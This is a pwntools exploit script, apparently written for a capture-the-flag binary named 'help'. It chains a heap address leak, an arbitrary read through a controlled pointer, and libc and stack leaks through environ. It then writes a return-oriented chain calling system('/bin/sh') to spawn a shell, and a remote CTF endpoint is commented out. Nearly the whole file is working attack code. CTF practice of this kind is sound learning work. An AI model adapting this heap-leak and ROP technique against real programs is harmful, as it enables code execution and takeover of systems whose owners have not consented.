#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template help
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'help')
libc = ELF('./libc.so.6')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug(
            [exe.path] + argv,
            gdbscript=gdbscript,
            *a, **kw
        )
    else:
        return process(
            [exe.path] + argv,
            env={"SHELL": "/bin/sh"},  # <-- Add here too if needed
            stdout=PIPE,
            *a, **kw
        )

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

n = 368
io = start()
#io = remote('ctf.csd.lol',7777)
# input()
io.recvline() #welcome...
io.recvline() #available commands...io.recvline() #welcome...
# io.recvline() # NEEDED FOR DEBUGGING

# capture heap leak
io.sendline(b'malloc malloc')
io.sendline(b'malloc free malloc puts')

leak = io.recvuntil(b'\n',drop = True)
# print(leak)
# print(type(leak))

integer_value = int.from_bytes(leak, byteorder='little')

log.info(f'leak is {hex(integer_value)}')

#convert to base
leak_str = str(hex(integer_value))+"000"

libc_leak = int(leak_str,16)
heap_base = libc_leak
# heap_base = libc_leak - 0x1000
log.info(f'heap leak is {hex(libc_leak)}, heap base is at {hex(heap_base)}')

#first malloc up to the input 
for i in range(15):
    io.sendline(b'malloc')

# #now we have control over a pointer. 
payload = b'A'*8 # skip past 8 bytes of our input
payload += p64(heap_base-(n * 8)) # point to the chunk we want to free (or read)
io.sendline(payload)
# io.interactive()
io.recvline() #invalid command!


# log.info(f'freeing chunk at {hex(heap_base+0x19e0)}')
# io.sendline(b'free') #freed an arbitrary chunk!! -> this effectively gives us a arbitrary write. we also can get an arbitrary read (i think)

log.info(f'reading chunk at {hex(heap_base-(n*8))}')
io.sendline(b'puts')
leak = io.recvuntil(b'\n',drop = True)
print(leak)
print(type(leak))
integer_value = int.from_bytes(leak, byteorder='little')

# if leak == b'':
#   pass
# elif leak == b'invalid command':
#   pass
# else:
#   log.info(f'found possible leak at {hex(heap_base-(n*8))}')
#   log.info(f'leak is {hex(integer_value)}') #arbitrary read is successful!!
#   libc.address = integer_value - 0x0000000000202228
#   malloc_hook = integer_value + 0x5c60
#   environ = libc.address + 0x24d2d0
#   log.info(f'malloc hook is at {hex(malloc_hook)},libc base is at {hex(libc.address)}, environ is at {hex(environ)}')
#   break

print(n)

log.info(f'leak is {hex(integer_value)}') #arbitrary read is successful!!
libc.address = integer_value - 0x0000000000202228
malloc_hook = integer_value + 0x5c60
# environ = libc.address + 0x24d2d0
environ = libc.address + 0x000000000020ad58
log.info(f'malloc hook is at {hex(malloc_hook)},libc base is at {hex(libc.address)}, environ is at {hex(environ)}')


# do another read to get stack leak...
payload = b'A'*8 # skip past 8 bytes of our input
payload += p64(environ) # point to the chunk we want to free (or read)
io.sendline(payload)

io.recvline() #invalid command!

log.info(f'reading chunk at {hex(environ)}')
io.sendline(b'puts')
leak = io.recvuntil(b'\n',drop = True)
print(leak)
print(type(leak))

stack_leak = int.from_bytes(leak, byteorder='little')
rip_addr = stack_leak - 0xb10


log.info(f'leak is {hex(stack_leak)}, RIP is at {hex(rip_addr + 0x40)}')


# second stage, www
# first, overwrite the old pointer to libc.

payload = b'A'*8 # skip past 8 bytes of our input
payload += p64(rip_addr+0x750) # point to the chunk we want to free  #try writing at rip + 0x40? seems to be another possible one. 

#another possible one is + 0x750. 0x20. 0x7f0.
io.sendline(payload)

io.recvline() #invalid command!

actual_libc_address = environ - 0x000000000020ad58 
# now call scanf
io.sendline(b'scanf')
log.info(f'system is at {hex(actual_libc_address+0x0000000000058740)}')
pop_rdi = p64(actual_libc_address + 0x000000000010f75b)
system = p64(actual_libc_address + 0x0000000000058740)
bin_sh = p64(actual_libc_address+ 0x1cb42f)
ret = p64(actual_libc_address + 0x000000000002882f)
payload = pop_rdi + bin_sh + ret + system
# io.sendline(b'AAAAAAAA') # arb write!
io.sendline(payload)



io.interactive()



